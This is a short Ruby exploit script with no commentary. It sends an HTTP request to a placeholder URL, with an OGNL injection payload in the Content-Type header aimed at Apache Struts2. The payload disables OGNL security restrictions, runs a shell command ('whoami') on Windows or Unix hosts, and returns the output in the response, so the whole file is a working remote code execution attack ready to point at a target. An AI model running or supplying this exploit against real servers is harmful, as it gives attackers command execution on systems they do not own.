require "net/http"
require "uri"
require "openssl"

uri = URI.parse("ENTERURLHERE")
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true

request = Net::HTTP::Get.new(uri.request_uri)
request["Connection"] = "close"
request["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0"
request["Accept"] = "*/*"
request["Content-Type"] = "Content-Type:%{(\x23_='multipart/form-data').(\x23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(\x23_memberAccess?(\x23_memberAccess=\x23dm):((\x23container=\x23context['com.opensymphony.xwork2.ActionContext.container']).(\x23ognlUtil=\x23container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(\x23ognlUtil.getExcludedPackageNames().clear()).(\x23ognlUtil.getExcludedClasses().clear()).(\x23context.setMemberAccess(\x23dm)))).(\x23cmd='whoami').(\x23iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(\x23cmds=(\x23iswin?{'cmd.exe','/c',\x23cmd}:{'/bin/bash','-c',\x23cmd})).(\x23p=new java.lang.ProcessBuilder(\x23cmds)).(\x23p.redirectErrorStream(true)).(\x23process=\x23p.start()).(\x23ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(\x23process.getInputStream(),\x23ros)).(\x23ros.flush())}"
response = http.request(request)

puts "Status code: "+response.code
puts "Response body: "+response.body
